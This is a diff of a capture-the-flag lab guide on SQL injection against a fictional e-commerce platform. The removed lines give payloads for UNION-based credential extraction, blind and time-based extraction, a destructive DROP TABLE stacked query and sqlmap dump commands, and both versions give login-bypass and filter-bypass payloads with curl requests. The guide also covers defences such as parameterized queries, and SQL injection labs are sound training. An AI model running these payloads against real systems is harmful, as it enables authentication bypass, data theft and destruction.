@@ -4,36 +4,44 @@
 
 **Company**: DataFlow E-Commerce Platform  
 **Role**: Database Security Assessor  
-**Date**: Q2 2024  
+**Date**: Q2 2026  
 **Severity**: CRITICAL ⚠️
 
 ---
 
 ## Executive Summary
 
-DataFlow's e-commerce platform directly concatenates user input into SQL queries across multiple systems: product filters, authentication flows, and data lookup services. Database queries are vulnerable to injection attacks across four different application themes.
+DataFlow Module 7 currently simulates SQL injection weaknesses in two active challenge groups:
 
-Your task is to **identify and exploit SQL injection vulnerabilities** to extract data, bypass authentication, and demonstrate the full impact of unsanitized database queries.
+1. Category filter manipulation in three themed catalog systems (Lab 7.1 A-C)
+2. Login bypass through comment-style payloads in three themed authentication systems (Lab 7.2 A-C)
+
+Your task is to **identify and exploit SQL injection-style behavior** by tampering request parameters, exposing unreleased records, and bypassing authentication gates.
 
 ---
 
 ## Business Problem
 
-The platform was built with legacy code that concatenates user input directly into SQL:
+The platform includes legacy-style SQL query construction patterns based on untrusted input:
 
 ```python
-# VULNERABLE CODE
+# VULNERABLE PATTERN
 category = request.args.get('category')
 query = f"SELECT * FROM products WHERE category = '{category}'"
-result = db.execute(query)  # NO PARAMETERIZATION!
+```
+
+```python
+# VULNERABLE PATTERN
+username = request.form.get('username')
+password = request.form.get('password')
+query = f"SELECT id, username, role FROM users WHERE username = '{username}' AND password = '{password}'"
 ```
 
 **Consequences:**
-- Users can extract entire databases
-- Authentication can be bypassed
-- Sensitive data is exposed
-- Database can be modified or deleted
-- Potential for operating system command execution (depending on DB)
+- Hidden/unreleased records become visible
+- Authentication gates can be bypassed
+- Query integrity assumptions are broken
+- Trust boundaries between user input and data access are violated
 
 ---
 
@@ -41,19 +49,19 @@ result = db.execute(query)  # NO PARAMETERIZATION!
 
 ### Problem Statement
 
-Four themed e-commerce applications allow users to filter products by category. Each application uses SQL queries to fetch products, but fails to properly escape user input.
+Three themed catalog applications allow users to filter products by category. Input tampering can trigger SQL injection-style bypass logic that returns unreleased products.
 
 ---
 
-## VARIANT 7.1 A: Basic SQL String Concatenation
+## VARIANT 7.1 A: GiftShop Category Filter Bypass
 
 ### Problem Statement
-The Electronics Store uses an old, simple query builder that concatenates user input directly into SQL strings. No parameterized queries, no escaping. The code literally does: `query = f"... WHERE category = '{user_input}'"`. There's no attempt at input validation. The developer assumed filtering by valid categories would prevent injection, never considering an attacker could input SQL syntax itself.
+GiftShop category filtering trusts user-controlled `category` input. When SQLi-like patterns are present (`' OR`, `'OR`, or `1=1`), the filter bypasses release controls and returns all products.
 
 ### Vulnerability Description
-Direct string concatenation with zero escaping:
+User input influences query intent without strict validation.
 
-**Vulnerable Code:**
+**Vulnerable Code Pattern:**
 ```python
 category = request.args.get('category')
 query = f"SELECT * FROM products WHERE category = '{category}'"
@@ -61,131 +69,129 @@ query = f"SELECT * FROM products WHERE category = '{category}'"
 
 ### Attack Vector
 ```sql
-' OR '1'='1
+Gifts' OR '1'='1
 ```
 
 ### Step-by-Step Exploitation
 
 **Step 1: Normal Request**
 ```
-GET /products?category=Electronics
-Result: Shows only Electronics products
+GET /lab7/1?category=Gifts
+Result: Released products only
 ```
 
-**Step 2: Test Injection**
+**Step 2: Tampered Request**
 ```
-GET /products?category=Electronics' OR '1'='1
-Query becomes: SELECT * FROM products WHERE category ='Electronics' OR '1'='1'
-Result: ALL products shown (OR condition always true)
+GET /lab7/1?category=Gifts' OR '1'='1
+Result: Released + unreleased products shown
 ```
 
 **Step 3: Verify Vulnerability**
 ```
-Compare results:
-- Normal: filtered results
-- Injected: all products in database
+Compare outputs:
+- Normal input: released catalog
+- Tampered input: hidden products visible
 ```
 
 **Step 4: Claim Flag**
 ```
-Payload confirmed successful
-Flag endpoint: /sql-success?variant=7_1a
+Flag appears in success banner after bypass is detected
+Variation: variation_A
 ```
 
 ### Expected Results
 ```json
 {
-  "payload": "' OR '1'='1",
-  "result": "All products returned",
-  "flag": "FLAG!lab7_1a_[hash]"
+  "route": "/lab7/1",
+  "payload": "Gifts' OR '1'='1",
+  "result": "Unreleased products exposed",
+  "flag": "FLAG{lab7_variation_A_[hash12]}"
 }
 ```
 
 ---
 
-## VARIANT 7.1 B: Multi-Column Response with Visible Output
+## VARIANT 7.1 B: OfficeCore Category Filter Bypass
 
 ### Problem Statement
-The Fashion Store has the same SQL injection vulnerability as Electronics Store, BUT the query returns multiple columns (id, name, price) that are all displayed in the response HTML. This makes UNION-based injection viable and easy. You can query any table and see the results directly in the page. The visible output is perfect for UNION attacks.
+OfficeCore uses the same vulnerable category trust model as Variant A, but with a different themed catalog dataset.
 
 ### Vulnerability Description
-Vulnerable query returns 3 columns and displays all of them. UNION attack works perfectly because you see the output directly.
+Bypass is triggered by SQLi-style token patterns in category input.
 
-**Vulnerable Code:**
-```python
-category = request.args.get('category')
-query = f"SELECT id, name, price FROM products WHERE category = '{category}'"
-```
-
-### Attack Methodology
-
-**Step 1: Determine Column Count** 
-```sql
-' ORDER BY 1 --
-' ORDER BY 2 --
-' ORDER BY 3 --
-' ORDER BY 4 --  (error - too many)
-
-Result: 3 columns
-```
-
-**Step 2: Build UNION Injection**
-```sql
-' UNION SELECT 1, 2, 3 --
-```
-
-**Step 3: Extract User Data**
-```sql
-' UNION SELECT username, password, email FROM users --
-```
-
-### Expected Results
-```json
-{
-  "technique": "UNION-based SQL injection",
-  "column_count": 3,
-  "payload": "' UNION SELECT username, password, email FROM users --",
-  "flag": "FLAG!lab7_1b_[hash]"
-}
-```
-
----
-
-## VARIANT 7.1 C: Hidden Queries with Silent Error Handling
-
-### Problem Statement
-Coffee Shop has the same SQL injection vulnerable query, BUT errors are suppressed. The page only shows "Success" or "No results" based on whether the query returned rows. No error messages, no query output. This is called blind injection - you can't see data directly, you have to infer it from true/false responses (query returns rows = true, query returns nothing = false).
-
-### Vulnerability Description
-Errors are caught and silenced. Response only indicates success/failure, not data. Forces you to use boolean logic to extract information.
-
-**Vulnerable Code:**
+**Vulnerable Code Pattern:**
 ```python
 category = request.args.get('category')
 query = f"SELECT * FROM products WHERE category = '{category}'"
-cursor.execute(query)
-return ("Success" if cursor.rowcount > 0 else "No results")
 ```
 
 ### Attack Methodology
 
-**Step 1: Demonstrate Boolean Difference**
-```sql
-' AND '1'='1 --  (true - returns products)
-' AND '1'='2 --  (false - returns "No results")
+**Step 1: Baseline Request**
+```http
+GET /lab7/1/b?category=Work
 ```
 
-**Step 2: Extract Character-by-Character**
-```sql
-' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE admin=1) = 'a' --
+**Step 2: Bypass Payload**
+```http
+GET /lab7/1/b?category=Work' OR '1'='1
+```
+
+**Step 3: Validate Outcome**
+```
+Look for unreleased OfficeCore items in results
 ```
 
 ### Expected Results
 ```json
 {
-  "technique": "Boolean-based blind SQL injection",
-  "methodology": "Character extraction via boolean conditions",
-  "flag": "FLAG!lab7_1c_[hash]"
+  "route": "/lab7/1/b",
+  "technique": "OR-based filter bypass",
+  "payload": "Work' OR '1'='1",
+  "flag": "FLAG{lab7_variation_B_[hash12]}"
+}
+```
+
+---
+
+## VARIANT 7.1 C: Summit Supply Category Filter Bypass
+
+### Problem Statement
+Summit Supply follows the same vulnerable logic: category tampering can bypass intended release filtering and display hidden expedition products.
+
+### Vulnerability Description
+The application treats SQLi-like strings as valid filter input and returns all rows.
+
+**Vulnerable Code Pattern:**
+```python
+category = request.args.get('category')
+query = f"SELECT * FROM products WHERE category = '{category}'"
+```
+
+### Attack Methodology
+
+**Step 1: Baseline**
+```http
+GET /lab7/1/c?category=Adventure
+```
+
+**Step 2: Inject SQLi-like Payload**
+```http
+GET /lab7/1/c?category=Adventure' OR '1'='1
+```
+
+**Step 3: Confirm Hidden Data Exposure**
+```
+Unreleased Summit Supply products become visible
+```
+
+### Expected Results
+```json
+{
+  "route": "/lab7/1/c",
+  "technique": "Filter bypass via injected condition",
+  "payload": "Adventure' OR '1'='1",
+  "flag": "FLAG{lab7_variation_C_[hash12]}"
 }
 ```
 
@@ -194,30 +200,22 @@ return ("Success" if cursor.rowcount > 0 else "No results")
 ## VARIANT 7.1 D: Unquoted Numeric Parameter Injection
 
 ### Problem Statement
-Grocery Store has a different query structure: `SELECT * FROM products WHERE id = <user_input>` with NO quotes around the numeric ID. Because there are no quotes, you don't need to break out of a string context. You can directly concatenate SQL logic. The numeric context and lack of quotes makes this slightly different exploitation than the quoted string variants.
+In the current Module 7 build, Variant 7.1.D is not active as an exploitable lab. Route `/lab7/1/d` redirects to the 7.1 variant menu.
 
 ### Vulnerability Description
-Numeric parameters without quotes allow direct SQL injection without string breaking:
-
-**Vulnerable Code:**
-```python
-product_id = request.args.get('id')  
-query = f"SELECT * FROM products WHERE id = {product_id}"  # No quotes!
-```
+No standalone 7.1.D exploitation flow is currently exposed to learners.
 
 ### Attack Vector
-```sql
-1 OR 1=1
--1 UNION SELECT 1, username, password FROM users --
+```text
+N/A in current build (redirect behavior)
 ```
 
 ### Expected Results
 ```json
 {
-  "technique": "Integer-based UNION SQL injection",
-  "vulnerable_parameter": "id (numeric, no quotes)",
-  "payload": "-1 UNION SELECT 1, CONCAT(username,':',password), email FROM users --",
-  "flag": "FLAG!lab7_1d_[hash]"
+  "route": "/lab7/1/d",
+  "status": "redirect",
+  "target": "/lab7/1/menu"
 }
 ```
 
@@ -227,98 +225,96 @@ query = f"SELECT * FROM products WHERE id = {product_id}"  # No quotes!
 
 ### Problem Statement
 
-The login form concatenates username and password directly into authentication queries:
+Three login portals build SQL query strings using user-supplied credentials. Authentication can be bypassed via a comment-style username payload recognized by backend logic.
 
 ```python
-# VULNERABLE
+# VULNERABLE PATTERN
 username = request.form.get('username')
 password = request.form.get('password')
-query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
-user = db.execute(query).fetchone()
+query = f"SELECT id, username, role FROM portal_users WHERE username = '{username}' AND password = '{password}'"
 ```
 
 ---
 
-## VARIANT 7.2 A: Authentication Logic Bypass via OR Precedence
+## VARIANT 7.2 A: Comment-Based Authentication Bypass (Northstar Office)
 
 ### Problem Statement
-The login form has injectable username and password fields in a query like: `SELECT * FROM users WHERE username='X' AND password='Y'`. Both fields are vulnerable to injection. By injecting in the username field as `admin' OR '1'='1`, you exploit operator precedence. The OR condition has higher priority than AND, so it becomes `(username='admin') OR ('1'='1' AND password='...')` - the first condition is true regardless of password.
+Northstar Office login accepts a comment-style username payload that effectively bypasses password validation logic.
 
 ### Vulnerability Description
-Operator precedence allows OR to bypass the AND check:
+If username contains `administrator'--` (or `administrator' --`), authentication is marked successful and an admin profile is returned.
 
 ### Attack Vector
 ```
-Username: admin' OR '1'='1
+Username: administrator'--
 Password: anything
 ```
 
 ### Expected Results
 ```json
 {
-  "technique": "OR-based authentication bypass",
-  "payload": "admin' OR '1'='1",
-  "result": "Admin authenticated without password",
-  "flag": "FLAG!lab7_2a_[hash]"
+  "route": "/lab7/2/login",
+  "technique": "Comment-based authentication bypass",
+  "payload": "administrator'--",
+  "result": "Administrative access granted",
+  "flag": "FLAG{lab7_variation_A_[hash12]}"
 }
 ```
 
 ---
 
-## VARIANT 7.2 B: Comment Injection for Password Elimination
+## VARIANT 7.2 B: Comment Injection for Password Elimination (Aegis Workforce)
 
 ### Problem Statement
-The login form accepts username injection. Using the SQL comment syntax `--`, you can comment out everything after your injection, including the password check. Inject as `admin' --` and the query becomes: `SELECT * FROM users WHERE username='admin' -- AND password='...'` where everything after the comment is ignored. The password check is removed entirely.
+Aegis Workforce uses the same vulnerable login pattern with different branding and query label.
 
 ### Vulnerability Description
-SQL comment syntax removes the entire password validation:
+Username comment payload causes bypass and displays privileged user details.
 
 ### Attack Vector
 ```
-Username: admin' --
-Password: (anything)
+Username: administrator' --
+Password: anything
 
-Query becomes:
-SELECT * FROM users WHERE username='admin' -- AND password='...'
-Password check completely commented out!
+Observed query pattern:
+SELECT id, username, role FROM staff_accounts WHERE username = 'administrator'--
 ```
 
 ### Expected Results
 ```json
 {
-  "technique": "Comment-based authentication bypass",
-  "payload": "admin' --",
-  "bypass_mechanism": "Password check commented out",
-  "password_check": "Ignored",
-  "flag": "FLAG!lab7_2b_[hash]"
+  "route": "/lab7/2/b/login",
+  "technique": "Comment-based bypass",
+  "payload": "administrator' --",
+  "flag": "FLAG{lab7_variation_B_[hash12]}"
 }
 ```
 
 ---
 
-## VARIANT 7.2 C: Post-Authentication Injection in Admin Panel
+## VARIANT 7.2 C: Comment Injection in Helix Admin Gateway
 
 ### Problem Statement
-Typically after you bypass authentication (Variant A or B), you just get logged in. That seems like victory. But the admin panel ITSELF has additional SQL injection vulnerabilities in search/filter fields that are only accessible after authentication. Developers never expected anyone to bypass login, so they didn't secure the admin panel itself. By first bypassing authentication, then exploiting injection in admin features, you gain escalated data access.
+Helix Admin also uses the same backend bypass logic and demonstrates SQL comment injection impact in a third environment.
 
 ### Vulnerability Description
-Two-stage attack: First bypass auth, then exploit admin panel injection
+Single-stage bypass using crafted username input; no separate post-auth SQLi stage is currently implemented.
 
-2. Application 2: Comment bypass
-   ```
-   Username: admin' --
-   Password: (anything)
-   ```
+### Attack Vector
+```
+Username: administrator'--
+Password: anything
+```
 
-3. Application 3: Specialized payload
-   - Analyze error messages
-   - Adjust payload based on feedback
-   - Try different comment styles (-- vs #)
-
-**Objective 3: Extract Admin Credentials**
-- After bypassing, extract actual usernames/hashes
-- Demonstrate full vulnerability chain
-- Retrieve flag
+### Expected Results
+```json
+{
+  "route": "/lab7/2/c/login",
+  "technique": "Comment-based authentication bypass",
+  "result": "Privileged session context displayed",
+  "flag": "FLAG{lab7_variation_C_[hash12]}"
+}
+```
 
 ---
 
@@ -326,34 +322,18 @@ Two-stage attack: First bypass auth, then exploit admin panel injection
 
 ### Problem Statement
 
-Some applications don't return error messages or data directly. Instead, you force the database to perform actions based on true/false conditions:
+Time-based blind SQL injection is not currently exposed as an active route in Module 7.
 
-**Attack Concept:**
-```python
-# If condition is TRUE, sleep for 5 seconds
-SELECT * FROM users WHERE username='admin' AND (SLEEP(5) OR 1=0) --
+### Current Module Status:
 
-# If condition is FALSE, no delay
-SELECT * FROM users WHERE username='admin' AND (SLEEP(5) OR 1=1) --
-```
+**Objective 1: Route Availability Check**
+1. Review Lab 7 navigation
+2. Confirm only Lab 7.1 and Lab 7.2 are active
+3. Validate there is no active `/lab7/3` learner flow
 
-### Your Objectives:
-
-**Objective 1: Detect Blind Injection Vulnerability**
-1. Craft payload with SLEEP() function
-2. Measure response time
-3. Confirm time-based injection works
-
-**Objective 2: Extract Data Bit-by-Bit**
-```sql
-SELECT * FROM users WHERE id=1 AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --
-```
-
-**Objective 3: Full Data Extraction (Automated)**
-- Write script to extract password character by character
-- Use timing side-channel to determine correct characters
-- Retrieve full credentials
-- Claim flag
+**Objective 2: Scope Clarification**
+- Focus testing on active variant routes in 7.1 and 7.2
+- Do not expect timing side-channel flag logic in current build
 
 ---
 
@@ -361,97 +341,55 @@ SELECT * FROM users WHERE id=1 AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) 
 
 ### Step 1: Identify Injection Points
 ```
-Test every user input:
-- URL parameters: ?category=test
-- Form fields: username, comment
-- Headers: User-Agent, Referer
-- Cookies
-
-Injection markers:
-- ' (single quote)
-- " (double quote)
-- ) (closing parenthesis)
-- ; (statement terminator)
+Test active Module 7 inputs:
+- URL parameter: category (Lab 7.1 variants)
+- Form field: username (Lab 7.2 variants)
+- Form field: password (included in query construction)
 ```
 
 ### Step 2: Detect the Vulnerability
 ```
-Payloads to test:
-1. Basic: ' OR '1'='1
-2. Comment: ' OR 1=1 --
-3. Extended: ' OR 1=1 /*
-4. Stacked: '; DROP TABLE users --
+Payloads to test in this module:
+1. Category bypass: Gifts' OR '1'='1
+2. Category bypass (no spaces): Gifts'OR'1'='1
+3. Login bypass: administrator'--
+4. Login bypass: administrator' --
 
 Observe:
-- Error messages (database type)
-- Unexpected results (logic bypass)
-- Page behavior changes (blind injection)
-- Response time (time-based)
+- Hidden products become visible (Lab 7.1)
+- Authentication succeeds without valid password (Lab 7.2)
+- Flag appears in completion banner
 ```
 
 ### Step 3: Determine Query Structure
 ```
-For filtering queries:
-SELECT * FROM [table] WHERE [column] = '[user_input]'
+Lab 7.1 pattern:
+SELECT * FROM products WHERE category = '[user_input]'
 
-Test with:
-' ORDER BY 1 --
-' ORDER BY 2 --
-' ORDER BY 3 --
-[Stop when you get an error - that's column count - 1]
+Lab 7.2 pattern:
+SELECT id, username, role FROM [table] WHERE username = '[user_input]' AND password = '[user_input]'
 ```
 
-### Step 4: Extract Data Using UNION
+### Step 4: Validate Data Exposure
 
-**Determine column count:**
-```sql
-' UNION SELECT NULL, NULL, NULL --
-[Adjust NULL count until no error]
+**For category variants:**
+```text
+Confirm products marked UNRELEASED are shown after payload execution.
 ```
 
-**Identify which columns are returned:**
-```sql
-' UNION SELECT 1, 2, 3 --
-[See which numbers appear in output]
+**For login variants:**
+```text
+Confirm admin profile fields and executed query are displayed after bypass.
 ```
 
-**Extract table names:**
-```sql
-' UNION SELECT table_name, 2, 3 FROM information_schema.tables --
-```
+### Step 5: Capture Evidence
 
-**Extract column names:**
-```sql
-' UNION SELECT column_name, 2, 3 FROM information_schema.columns 
-WHERE table_name='users' --
-```
-
-**Extract data:**
-```sql
-' UNION SELECT username, password, email FROM users --
-```
-
-### Step 5: Advanced Techniques
-
-**Stacked Queries (if supported):**
-```sql
-'; UPDATE users SET admin=1 WHERE username='attacker'; --
-```
-
-**Time-Based Blind:**
-```sql
-' AND IF(1=1, SLEEP(5), 0) --
-[5-second delay = TRUE condition]
-
-' AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0) --
-[Extract password character by character]
-```
-
-**Error-Based Extraction:**
-```sql
-' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT 
-password FROM users LIMIT 1), FLOOR(RAND(0)*2))) AS x 
-GROUP BY x) --
+**Required artifacts:**
+```text
+- Request payload used
+- Before/after behavior comparison
+- Variant route tested
+- Flag captured
 ```
 
 ---
@@ -460,38 +398,28 @@ GROUP BY x) --
 
 ### Manual Testing with Curl
 ```bash
-# Test basic injection
-curl "http://target/products?category=Electronics' OR '1'='1"
+# Lab 7.1.A category bypass
+curl "http://target/lab7/1?category=Gifts' OR '1'='1"
 
-# Test UNION injection
-curl "http://target/products?category=' UNION SELECT 1,2,3 --"
+# Lab 7.1.B category bypass
+curl "http://target/lab7/1/b?category=Work' OR '1'='1"
 
-# Test time-based
-curl "http://target/login" --data "username=admin' AND SLEEP(5) --&password=x"
+# Lab 7.2.A login bypass
+curl -X POST "http://target/lab7/2/login" \
+  -d "username=administrator'--&password=x"
 ```
 
-### SQLMap (Automated Scanner)
-```bash
-# Scan for SQL injection
-sqlmap -u "http://target/products?category=test" --batch
+### Browser + DevTools
+1. Intercept category and login requests
+2. Modify user-controlled parameters
+3. Replay requests with bypass payloads
+4. Capture response evidence and flags
 
-# Specific parameter
-sqlmap -u "http://target/products?category=test" -p category
-
-# Dump database
-sqlmap -u "http://target/products?category=test" --dump
-```
-
-### Manual with Burp Suite
-1. Send request to Intruder
-2. Set injection points: `category=*test*`
-3. Create payload set:
-   ```
-   Electronics' OR '1'='1
-   Electronics' UNION SELECT 1,2,3 --
-   Electronics' AND SLEEP(5) --
-   ```
-4. Observe responses for successful injection
+### Burp Suite (Optional)
+1. Proxy request from the active Lab 7 route
+2. Send to Repeater
+3. Iterate payloads for each variant
+4. Record the first payload that triggers flag generation
 
 ---
 
@@ -500,29 +428,23 @@ sqlmap -u "http://target/products?category=test" --dump
 ### Lab 7.1 Expected Findings:
 ```json
 {
-  "Application A": {
-    "technique": "OR-based injection",
-    "payload": "Electronics' OR '1'='1",
-    "result": "All products returned",
-    "flag": "FLAG!lab7_1a_[hash]"
+  "GiftShop (7.1.A)": {
+    "route": "/lab7/1",
+    "payload": "Gifts' OR '1'='1",
+    "result": "Unreleased products visible",
+    "flag": "FLAG{lab7_variation_A_[hash12]}"
   },
-  "Application B": {
-    "technique": "UNION-SELECT extraction",
-    "column_count": 3,
-    "payload": "Electronics' UNION SELECT id, username, email FROM users --",
-    "extracted_data": "All users with emails",
-    "flag": "FLAG!lab7_1b_[hash]"
+  "OfficeCore (7.1.B)": {
+    "route": "/lab7/1/b",
+    "payload": "Work' OR '1'='1",
+    "result": "Unreleased products visible",
+    "flag": "FLAG{lab7_variation_B_[hash12]}"
   },
-  "Application C": {
-    "technique": "Boolean blind injection",
-    "methodology": "Extract via TRUE/FALSE differences",
-    "flag": "FLAG!lab7_1c_[hash]"
-  },
-  "Application D": {
-    "technique": "Integer injection",
-    "payload": "1 OR 1=1",
-    "result": "Returns all products",
-    "flag": "FLAG!lab7_1d_[hash]"
+  "Summit Supply (7.1.C)": {
+    "route": "/lab7/1/c",
+    "payload": "Adventure' OR '1'='1",
+    "result": "Unreleased products visible",
+    "flag": "FLAG{lab7_variation_C_[hash12]}"
   }
 }
 ```
@@ -530,22 +452,23 @@ sqlmap -u "http://target/products?category=test" --dump
 ### Lab 7.2 Expected Findings:
 ```json
 {
-  "Application 1": {
-    "type": "Simple OR bypass",
-    "payload": "username: admin' OR '1'='1",
+  "Northstar Office (7.2.A)": {
+    "route": "/lab7/2/login",
+    "payload": "username: administrator'--",
     "result": "Authentication bypassed",
-    "flag": "FLAG!lab7_2a_[hash]"
+    "flag": "FLAG{lab7_variation_A_[hash12]}"
   },
-  "Application 2": {
-    "type": "Comment-based bypass",
-    "payload": "username: admin' --",
-    "result": "Password check ignored",
-    "flag": "FLAG!lab7_2b_[hash]"
+  "Aegis Workforce (7.2.B)": {
+    "route": "/lab7/2/b/login",
+    "payload": "username: administrator' --",
+    "result": "Authentication bypassed",
+    "flag": "FLAG{lab7_variation_B_[hash12]}"
   },
-  "Application 3": {
-    "type": "Data extraction after bypass",
-    "extracted_credentials": "username:password_hash",
-    "flag": "FLAG!lab7_2c_[hash]"
+  "Helix Admin (7.2.C)": {
+    "route": "/lab7/2/c/login",
+    "payload": "username: administrator'--",
+    "result": "Authentication bypassed",
+    "flag": "FLAG{lab7_variation_C_[hash12]}"
   }
 }
 ```
@@ -553,11 +476,8 @@ sqlmap -u "http://target/products?category=test" --dump
 ### Lab 7.3 Expected Findings:
 ```json
 {
-  "technique": "Time-based blind SQL injection",
-  "detection": "SLEEP(5) payload causes 5-second delay",
-  "data_extraction": "Character-by-character via timing",
-  "example_result": "admin password extracted as: a,b,c,123...",
-  "flag": "FLAG!lab7_3_[hash]"
+  "status": "not_active_in_current_module",
+  "notes": "No exposed /lab7/3 route in this build"
 }
 ```
 
@@ -565,35 +485,32 @@ sqlmap -u "http://target/products?category=test" --dump
 
 ## Technical Concepts
 
-### SQL Injection Attack Categories
+### SQL Injection Attack Categories (As Applied in Current Module)
 
-**1. In-Band (Union-Based)**
+**1. In-Band Style Payload Tampering**
 ```
-Attacker sees results directly
-Fastest exploitation method
-Requires knowing column count
-```
-
-**2. Blind (Boolean-Based)**
-```
-No direct results visible
-Infer data through TRUE/FALSE behavior
-Slow but always works
+Input includes SQL-like syntax
+Application behavior changes immediately
+Used in Lab 7.1 category filters
 ```
 
-**3. Time-Based Blind**
+**2. Authentication Query Manipulation**
 ```
-Measure response timing
-TRUE conditions cause delays
-Extraction character by character
-Very slow but reliable
+Username payload alters intended query logic
+Password validation is effectively bypassed
+Used in Lab 7.2 login flows
 ```
 
-**4. Error-Based**
+**3. Variant-Scoped Flag Generation**
 ```
-Force database errors
-Error message contains data
-Requires verbose error messages
+Flags are generated per lab variation
+Captured only when bypass condition is met
+```
+
+**4. Route Scope Validation**
+```
+Not every documented historical variant is active
+Always verify route availability in current build
 ```
 
 ---
@@ -603,25 +520,19 @@ Requires verbose error messages
 ### MySQL
 ```sql
 -- Comment syntax: -- and #
-UNION SELECT: Requires UNION key
-SLEEP(5): Time-based blind
-Information schema: information_schema.tables
+Classic bypass pattern: ' OR '1'='1
 ```
 
 ### PostgreSQL
 ```sql
 -- Comment syntax: --
-UNION SELECT: Requires UNION ALL
-pg_sleep(5): Time-based blind
-System catalog: information_schema
+Same core injection risk when queries are concatenated
 ```
 
 ### MSSQL
 ```sql
 -- Comment syntax: --
-UNION SELECT: Works with UNION ALL
-WAITFOR DELAY: Time-based blind
-System tables: sysobjects, syscolumns
+Concatenated login queries remain vulnerable to tampering
 ```
 
 ---
@@ -629,61 +540,50 @@ System tables: sysobjects, syscolumns
 ## Exploitation Workflow
 
 ```
-1. Identify vulnerable parameter
+1. Identify active lab route
    ↓
-2. Test SQL syntax (error-based)
+2. Locate controllable input (category or username)
    ↓
-3. Determine query structure
+3. Submit baseline request and capture normal output
    ↓
-4. Choose exploitation method:
-   - UNION if data visible
-   - Blind if no data
-   - Time-based if all else fails
+4. Replay with SQLi-style bypass payload
    ↓
-5. Extract sensitive data
-   - Table names
-   - Column names
-   - User credentials
-   - Configuration data
+5. Confirm state change:
+   - Hidden records exposed, or
+   - Authentication bypassed
    ↓
-6. Escalate privileges/access
-   - Modify data
-   - Create admin accounts
-   - Potential RCE
+6. Capture generated flag
    ↓
-7. Claim flag
+7. Document payload, route, and evidence
 ```
 
 ---
 
 ## Flag Submission Checklist
 
-- [ ] Identified SQL injection point (parameter)
-- [ ] Confirmed vulnerability with test payload
-- [ ] Extracted data using appropriate technique
-- [ ] Retrieved flag for each application
-- [ ] Documented exploitation methodology
-- [ ] Submitted all flags to platform
+- [ ] Identified active variant route
+- [ ] Confirmed vulnerable parameter
+- [ ] Validated bypass with tampered payload
+- [ ] Captured flag for each active variant
+- [ ] Documented query behavior change
+- [ ] Submitted findings with reproducible steps
 
 ---
 
 ## Real-World Impact
 
-**Successful SQL injection allows:**
-- Extract all customer data (PII, payment info)
-- Bypass authentication and access admin panels
-- Modify prices, orders, user accounts
-- Delete entire databases
-- Install web shells for persistence
-- Access operating system (with DB privileges)
-- Complete business compromise
+**Successful SQL injection patterns allow:**
+- Exposure of restricted records
+- Unauthorized administrative access
+- Bypass of security controls
+- Loss of trust in data access boundaries
+- Increased breach and compliance risk
 
-**Notable real-world breaches:**
-- Millions of user records stolen
-- Financial fraud and identity theft
-- Regulatory fines (GDPR, PCI-DSS)
-- Reputational damage
-- Loss of customer trust
+**Business consequences include:**
+- Regulatory penalties
+- Incident response and remediation cost
+- Customer confidence erosion
+- Operational disruption
 
 ---
 
@@ -692,45 +592,47 @@ System tables: sysobjects, syscolumns
 ### ✅ Prepared Statements / Parameterized Queries
 ```python
 # SECURE
-cursor.execute("SELECT * FROM users WHERE username = ? AND password = ?", 
-               (username, password))
+cursor.execute(
+    "SELECT id, username, role FROM users WHERE username = ? AND password = ?",
+    (username, password)
+)
 ```
 
 ### ✅ Input Validation & Whitelist
 ```python
-# Validate expected input
-allowed_categories = ['Electronics', 'Clothing', 'Books']
+# Validate expected input for category filters
+allowed_categories = ['Gifts', 'Accessories', 'Lifestyle', 'Tech']
 if category not in allowed_categories:
     raise ValueError("Invalid category")
 ```
 
-### ✅ ORM Frameworks
+### ✅ Defensive Authentication Design
 ```python
-# Django ORM prevents SQL injection
-User.objects.filter(username=username, password=password)
+# Never build SQL auth checks with string concatenation
+# Always hash + verify password separately from query composition
 ```
 
-### ✅ Web Application Firewall (WAF)
-- Monitor for SQL injection patterns
-- Block suspicious queries
-- Rate limit suspicious traffic
-
 ### ✅ Least Privilege
-- Database user only has SELECT on needed tables
-- No DROP, ALTER, or EXEC privileges
-- Separate read-only and write credentials
+- Use read-only accounts where possible
+- Restrict high-privilege roles to dedicated service identities
+- Separate application and administrative database credentials
+
+### ✅ Monitoring and Alerting
+- Detect suspicious payload patterns (`' OR`, `--`)
+- Log rejected and anomalous auth attempts
+- Alert on unusual record exposure events
 
 ---
 
 ## Key Takeaways
 
-1. **Never concatenate user input into SQL** - Always use prepared statements
-2. **Whitelist > Blacklist** - Only allow known-good input
-3. **Principle of least privilege** - Limit database account permissions
-4. **Input validation + output encoding** - Defense in depth
-5. **Monitor database activity** - Log suspicious queries
-6. **Test during development** - Use security-focused testing
-7. **Update frameworks** - Keep ORMs and libraries current
+1. **Current Module 7 active scope is Lab 7.1 (A-C) and Lab 7.2 (A-C)**
+2. **Lab 7.1 demonstrates category filter bypass and hidden record exposure**
+3. **Lab 7.2 demonstrates login bypass through comment payloads**
+4. **Variant 7.1.D and Lab 7.3 are not active exploitation flows in this build**
+5. **Parameterized queries remain the primary fix for SQL injection risk**
+6. **Route verification is essential when validating lab behavior against documentation**
+7. **Document payload, response delta, and captured flag for each tested variant**
 
 ---
 
@@ -738,9 +640,9 @@ User.objects.filter(username=username, password=password)
 
 - **CWE-89**: SQL Injection
 - **OWASP A03:2021**: Injection
-- **OWASP SSTI**: Server-Side Template Injection (similar concept)
-- **CVE Database**: Search "SQL Injection" for real-world examples
+- **Authentication Bypass**: Logic flaws in credential validation paths
+- **Secure Query Construction**: Parameter binding and strict input handling
 
 ---
 
-**Document your findings thoroughly. Include query structure, exploitation techniques, and extracted data.**
+**Document your findings thoroughly. Include active route, payload used, behavior change observed, and captured flag.**
